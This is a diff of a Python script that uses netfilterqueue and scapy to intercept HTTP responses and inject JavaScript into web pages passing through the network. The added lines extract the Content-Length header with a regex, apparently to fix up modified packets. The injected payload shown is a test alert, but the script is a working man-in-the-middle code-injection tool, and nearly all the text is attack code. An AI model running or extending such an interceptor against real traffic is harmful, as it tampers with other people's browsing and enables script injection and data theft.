@@ -2,6 +2,9 @@
 import netfilterqueue
 import scapy.all as scapy
 import re as regex
+# Using regex rule: (?:...). The () means to group and (?:...) means to not capture
+# Thus Content length is separated into two groups, the first group will not be captured
+# and the second group will be captured i.e. the digits that is included in the content length
 
 # Defining loader functionality
 def loader(packet, load):
@@ -29,6 +32,10 @@ def spoofed_packet(packets):
             print("[+] Response")
             # Injecting HTML/JavaScript Code in the response field aka the html code of the website
             scapy_loader = scapy_loader.replace("</body>", "<script>alert('test');</script></body>")
+            search_content_length = regex.search("(?:Content-Length:\s)(\d*)", scapy_loader)
+            if search_content_length:
+                content_length = search_content_length.group(1) # To match the first thing in the whole HTTP Load string
+                print(content_length)
 
         # Refactoring
         # Checking if scapy_loader is not equal to the raw layer of the scapy packet then execute the code
